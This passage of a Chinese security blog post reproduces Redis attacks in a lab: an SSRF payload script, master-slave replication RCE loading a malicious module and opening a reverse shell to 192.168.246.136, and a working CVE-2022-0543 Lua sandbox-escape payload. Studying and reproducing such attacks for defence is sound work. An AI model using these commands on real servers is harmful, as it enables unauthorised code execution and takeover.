data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment"># 将每个命令转换为 Redis 格式，并拼接到 payload 中</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">for</span> x <span class="token keyword">in</span> cmd<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        payload <span class="token operator">+=</span> quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240218151922911.png" alt="image-20240218151922911"></p><p>这里可以看到就已经执行成功了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240218152114358.png" alt="image-20240218152114358"></p><p>在目标服务器上也保存成功了，其他的这里就不在演示了，效果是一样的这里将上面生成的 payload 解码看一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240218152326264.png" alt="image-20240218152326264"></p><p>这样看就很明显了</p><h2 id="主从复制rce"><a class="anchor" href="#主从复制rce">#</a> 主从复制 RCE</h2><p>Redis 数据库是将数据缓存在内存中，所以它的读写速度非常之快。但是当数据读写量特别大的时候，服务器就很难承受那么高负载，这个时候 redis 的主从模式就起作用了。主从模式是指定一个 Redis 服务器作为主机，其他的 redis 服务器为备份机，虽然主机和从机中所存储的数据都是一样的，但是只有主机负责写，其他 redis 服务器负责读。读写分离的设计可以大幅度减轻单个 redis 服务器的负载压力，是一种牺牲空间来换取效率的方式，该漏洞存在于 4.x、5.x 版本中，所以这里还需要安装一个别的 4.0.8 版本的，前面也说了。</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240217181751747.png" alt="image-20240217181751747"></p><p>建立主从复制有三种方式：</p><ol><li>配置文件写入 <code>slaveof &lt;ip&gt; &lt;port&gt;</code></li><li>redis-server 启动命令后加入 <code>--slaveof &lt;ip&gt; &lt;port&gt;</code></li><li>连接到客户端之后执行： <code>slaveof &lt;ip&gt; &lt;port&gt;</code></li></ol><div class="note info"><p>我们建立主从关系只需要在从节点操作，主节点不用管</p></div><p>这里我又克隆了一个虚拟机，这里都连接上来建立主从复制</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240218171056145.png" alt="image-20240218171056145"></p><p>在主节点这里创建一个键值，然后在节点建立连接</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240218171448365.png" alt="image-20240218171448365"></p><p>这里可以看到，就已经可以看到主节点创建的键值了，已经做到了数据同步的效果。</p><div class="note info"><p>想要想解除主从关系可以执行 <code>SLAVEOF NO ONE</code></p></div><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>tcpdump <span class="token parameter variable">-i</span> any <span class="token parameter variable">-s</span> <span class="token number">0</span> <span class="token parameter variable">-X</span> <span class="token parameter variable">-w</span> /tmp/tcpdump.pcap</pre></td></tr></table></figure><p>这里使用 tcpdump 来抓包</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240218172528727.png" alt="image-20240218172528727"></p><p>这里是整个主从关系建立的过程，这里偷个图：<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNTY2NT90aW1lX18xMzExPW40JTJCeG5EMDdEdGklM0RMNFlxR05ubURVeDZZRGtpcktEdWVoR1lEJmFtcDthbGljaGxncmVmPWh0dHBzJTNBJTJGJTJGeHouYWxpeXVuLmNvbSUyRnQlMkY1NjY1I3RvYy0xMQ==">浅析 Redis 中 SSRF 的利用 - 先知社区 (aliyun.com)</span></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/20190713002514-a0feb180-a4c1-1.png" alt="20190713002514-a0feb180-a4c1-1"></p><p>​	而我们的利用方式就是在 Redis 4.x 版本后，通过外部扩展可以实现一个新的 Redis 命令来构造恶意 .so 文件，在两个 Redis 实例中设置主从模式的时候，主机可以通过 FULLRESYNC 同步文件到从机上，然后在从机上加载恶意 .so 文件即可执行命令。简单的说就是攻击者（主机）写一个 .so 文件，通过 FULLRESYNC 同步文件到受害者（从机）上。</p><p>工具：<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL24wYjBkeUNOL3JlZGlzLXJvZ3VlLXNlcnZlcg==">n0b0dyCN/redis-rogue-server: Redis(&lt;=5.0.5) RCE (github.com)</span></p><h3 id="远程主从复制"><a class="anchor" href="#远程主从复制">#</a> 远程主从复制</h3><p>远程主从复制主要指 redis 可以外连</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240218180027352.png" alt="image-20240218180027352"></p><p>或者选着反弹 shell</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240218180141491.png" alt="image-20240218180141491"></p><h3 id="本地主从复制"><a class="anchor" href="#本地主从复制">#</a> 本地主从复制</h3><p>如果 redis 只能本地连接的情况下，可以手动的实现脚本的部分操作</p><p>工具：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Rlc3R6ZXJvLXd6L0F3c29tZS1SZWRpcy1Sb2d1ZS1TZXJ2ZXI=">Testzero-wz/Awsome-Redis-Rogue-Server: Redis-Rogue-Server Implement (github.com)</span></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240218182839131.png" alt="image-20240218182839131"></p><p>这里先开启启动 Rouge Server 模式，作为主服务器，然后在目标主机上登录 redis 开启主从复制</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /tmp <span class="token comment">#一般 tmp 目录都有写权限，所以选择这个目录写入</span></pre></td></tr><tr><td data-num="2"></td><td><pre>config <span class="token builtin class-name">set</span> dbfilename module.so <span class="token comment">#设置导出文件的名字</span></pre></td></tr><tr><td data-num="3"></td><td><pre>slaveof <span class="token number">192.168</span>.246.136 <span class="token number">15000</span> <span class="token comment">#进行主从同步，将恶意 so 文件写入到 tmp 目录</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240218183322557.png" alt="image-20240218183322557"></p><p>这里可以看到服务器上 FULLRESYNC 在同步数据</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>module load ./module.so <span class="token comment">#加载写入的恶意 so 文件模块</span></pre></td></tr><tr><td data-num="2"></td><td><pre>module list <span class="token comment">#查看恶意 so 有没有加载成功，主要看有没有 “system”</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240218183503184.png" alt="image-20240218183503184"></p><p>可以看到这里已经成功加载了，但是这里没法执行命令。我们就上一个工具中的 so 文件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240218184728612.png" alt="image-20240218184728612"></p><p>这里将 redis-rogue-server 中的 exp.so 文件移动过来，然后重置环境再重复一次上面的工作</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /tmp <span class="token comment">#一般 tmp 目录都有写权限，所以选择这个目录写入</span></pre></td></tr><tr><td data-num="2"></td><td><pre>config <span class="token builtin class-name">set</span> dbfilename exp.so <span class="token comment">#设置导出文件的名字</span></pre></td></tr><tr><td data-num="3"></td><td><pre>slaveof <span class="token number">192.168</span>.246.136 <span class="token number">15000</span> <span class="token comment">#进行主从同步，将恶意 so 文件写入到 tmp 目录</span></pre></td></tr><tr><td data-num="4"></td><td><pre>module load ./exp.so <span class="token comment">#加载写入的恶意 so 文件模块</span></pre></td></tr><tr><td data-num="5"></td><td><pre>module list <span class="token comment">#查看恶意 so 有没有加载成功，主要看有没有 “system”</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240218185010603.png" alt="image-20240218185010603"></p><p>OK，这里可以看到就已经加载成功了，然后我们直接去反弹 shell 即可</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>system.rev <span class="token number">192.168</span>.246.136 <span class="token number">6767</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240218185143621.png" alt="image-20240218185143621"></p><h2 id="cve-2022-0543复现"><a class="anchor" href="#cve-2022-0543复现">#</a> CVE-2022-0543 复现</h2><p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cudWJlcmNvbXAuY29tL3Bvc3RzLzIwMjItMDEtMjBfcmVkaXNfb25fZGViaWFuX3JjZQ==">一个意外的 Redis 沙盒逃逸，只影响 Debian， Ubuntu 和其他 Debian 衍生产品 (ubercomp.com)</span></p><p>Redis 嵌入了 Lua 编程语言作为其脚本引擎，可通过 eval 命令使用。Lua 引擎应该是沙盒化的，即客户端可以与 Lua 中的 Redis API 交互，但不能在运行 Redis 的机器上执行任意代码。Ubuntu/Debian/CentOS 等这些发行版本会在原始软件的基础上打一些补丁包给 Redis 打了一个的补丁，在 Lua 沙箱中遗留了一个对象 <code>package</code> ，攻击者可以利用这个方法来加载动态链接库 liblua 里的函数，进而逃逸沙箱执行任意命令。</p><p>漏洞所在位置</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>debian<span class="token operator">/</span>lua_libs_debian<span class="token punctuation">.</span>c<span class="token operator">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    echo <span class="token string">"// Automatically generated; do not edit."</span> <span class="token operator">></span>$@</pre></td></tr><tr><td data-num="3"></td><td><pre>    echo <span class="token string">"luaLoadLib(lua, LUA_LOADLIBNAME, luaopen_package);"</span> <span class="token operator">>></span>$@</pre></td></tr><tr><td data-num="4"></td><td><pre>    set <span class="token operator">-</span>e<span class="token punctuation">;</span> <span class="token keyword">for</span> X in $<span class="token punctuation">(</span>LUA_LIBS_DEBIAN_NAMES<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">do</span> \</pre></td></tr><tr><td data-num="5"></td><td><pre>        echo <span class="token string">"if (luaL_dostring(lua, \"$$X = require('$$X');\"))"</span> <span class="token operator">>></span>$@<span class="token punctuation">;</span> \</pre></td></tr><tr><td data-num="6"></td><td><pre>        echo <span class="token string">"    serverLog(LL_NOTICE, \"Error loading $$X library\");"</span> <span class="token operator">>></span>$@<span class="token punctuation">;</span> \</pre></td></tr><tr><td data-num="7"></td><td><pre>    done</pre></td></tr><tr><td data-num="8"></td><td><pre>    echo '<span class="token function">luaL_dostring</span><span class="token punctuation">(</span>lua<span class="token punctuation">,</span> <span class="token string">"module = nil; require = nil;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>' <span class="token operator">>></span>$@</pre></td></tr></table></figure><p><code>luaLoadLib(lua, LUA_LOADLIBNAME, luaopen_package)</code> 就是漏洞的来源，。</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">git</span> clone https://github.com/vulhub/vulhub.git</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">cd</span> vulhub/redis/CVE-2022-0543/</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span></pre></td></tr></table></figure><p>这里我使用的是 vulhub 中的环境复现，payload 如下：</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">eval</span> <span class="token string">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res'</span> <span class="token number">0</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240218164206868.png" alt="image-20240218164206868"></p><p>这里可以看到 id 就已经执行了</p><div class="tags"><a href="/tags/Redis/" rel="tag"><i class="ic i-tag"></i> Redis</a></div></div><footer><div class="meta"><span id="2024/02/18/服务攻防/数据库安全-Redis数据库/" class="item leancloud_visitors" data-flag-title="Redis数据库安全" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Clown <i class="ic i-at"><em>@</em></i></li><li class="link"><strong>本文链接：</strong> <a href="https://blog.xcu.icu/2024/02/18/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis%E6%95%B0%E6%8D%AE%E5%BA%93/" title="Redis数据库安全">https://blog.xcu.icu/2024/02/18/服务攻防/数据库安全-Redis数据库/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2024/01/31/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Mysql%E6%95%B0%E6%8D%AE%E5%BA%93/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;129.jpg" title="Mysql数据库安全"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 服务攻防</span><h3>Mysql数据库安全</h3></a></div><div class="item right"><a href="/2024/03/04/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-IIS/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;106.jpg" title="IIS漏洞复现"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 服务攻防</span><h3>IIS漏洞复现</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#redis%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.</span> <span class="toc-text">Redis 是什么？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#redis%E5%AE%89%E8%A3%85"><span class="toc-number">3.</span> <span class="toc-text">Redis 安装</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEredis-320"><span class="toc-number">3.1.</span> <span class="toc-text">安装配置 redis-3.2.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis-408%E5%AE%89%E8%A3%85"><span class="toc-number">3.2.</span> <span class="toc-text">Redis-4.0.8 安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C"><span class="toc-number">3.3.</span> <span class="toc-text">redis 基本操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.3.1.</span> <span class="toc-text">连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81"><span class="toc-number">3.3.2.</span> <span class="toc-text">设置密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8"><span class="toc-number">3.3.3.</span> <span class="toc-text">常用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#redis%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">Redis 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">4.1.</span> <span class="toc-text">未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E5%86%99webshell"><span class="toc-number">4.1.1.</span> <span class="toc-text">redis 写 webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">4.1.2.</span> <span class="toc-text">计划任务反弹 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99ssh%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95ssh"><span class="toc-number">4.1.3.</span> <span class="toc-text">写 ssh 密钥登录 ssh</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redisssrf%E7%BB%84%E5%90%88%E6%8B%B3"><span class="toc-number">4.2.</span> <span class="toc-text">Redis&amp;SSRF 组合拳</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#resp%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.2.1.</span> <span class="toc-text">RESP 协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E6%8B%B3%E7%B2%98%E5%90%88%E5%89%82"><span class="toc-number">4.2.2.</span> <span class="toc-text">组合拳粘合剂</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6rce"><span class="toc-number">4.3.</span> <span class="toc-text">主从复制 RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">4.3.1.</span> <span class="toc-text">远程主从复制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">4.3.2.</span> <span class="toc-text">本地主从复制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2022-0543%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.4.</span> <span class="toc-text">CVE-2022-0543 复现</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2024/01/31/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Mysql%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="bookmark" title="Mysql数据库安全">Mysql数据库安全</a></li><li class="active"><a href="/2024/02/18/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="bookmark" title="Redis数据库安全">Redis数据库安全</a></li><li><a href="/2024/03/04/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-IIS/" rel="bookmark" title="IIS漏洞复现">IIS漏洞复现</a></li><li><a href="/2024/03/07/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-Apache/" rel="bookmark" title="Apache漏洞复现">Apache漏洞复现</a></li><li><a href="/2024/03/19/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-nginx/" rel="bookmark" title="Nginx漏洞复现">Nginx漏洞复现</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Clown" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Clown</p><div class="description" itemprop="description">一个妄想全栈web小废物</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">105</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">17</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">59</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nsb3duLXE=" title="https:&#x2F;&#x2F;github.com&#x2F;clown-q"><i class="ic i-github"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjI2NDIxMzczNjVAcXEuY29t" title="mailto:2642137365@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2024/01/31/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Mysql%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2024/03/04/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-IIS/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/Vulnhub/" title="分类于 Vulnhub">Vulnhub</a></div><span><a href="/2023/07/11/Vulnhub/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%A4%E8%80%81%E7%9A%84%E9%9D%B6%E6%9C%BAmedium_socnet%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="记一次古老的靶机medium_socnet的打靶记录">记一次古老的靶机medium_socnet的打靶记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/JavaJVM/" title="分类于 JavaJVM">JavaJVM</a></div><span><a href="/2023/09/10/JavaJVM/%E7%B1%BB%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/" title="虐心短片之类文件结构">虐心短片之类文件结构</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/JavaJVM/" title="分类于 JavaJVM">JavaJVM</a></div><span><a href="/2023/09/07/JavaJVM/GC%E6%9C%BA%E5%88%B6/" title="虐心短片之GC">虐心短片之GC</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" title="分类于 服务攻防">服务攻防</a></div><span><a href="/2024/03/19/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-nginx/" title="Nginx漏洞复现">Nginx漏洞复现</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/database/" title="分类于 数据库">数据库</a></div><span><a href="/2022/12/03/database/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%87%E5%87%86%E8%AF%AD%E8%A8%80SQL/" title="关系数据库标准语言SQL">关系数据库标准语言SQL</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/database/" title="分类于 数据库">数据库</a></div><span><a href="/2023/01/05/database/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E7%90%86%E8%AE%BA/" title="关系数据库理论">关系数据库理论</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Woodenhorse/" title="分类于 内存马">内存马</a></div><span><a href="/2023/11/02/Woodenhorse/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/" title="Servlet内存马">Servlet内存马</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/InternalNet/" title="分类于 内网">内网</a></div><span><a href="/2024/03/06/InternalNet/MSF%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" title="MSF工具的基本使用">MSF工具的基本使用</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/ctfshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2023/07/20/ctfshow/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/" title="CTFshow-web中期测评">CTFshow-web中期测评</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/JavaJVM/" title="分类于 JavaJVM">JavaJVM</a></div><span><a href="/2023/08/30/JavaJVM/%E8%99%90%E5%BF%83%E7%9F%AD%E7%89%87%E4%B9%8B%E5%88%9D%E8%AF%86JVM/" title="虐心短片之初识JVM">虐心短片之初识JVM</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2022 – <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Clown @ ClownのBlog</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">1m 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">15:18</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2024/02/18/服务攻防/数据库安全-Redis数据库/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->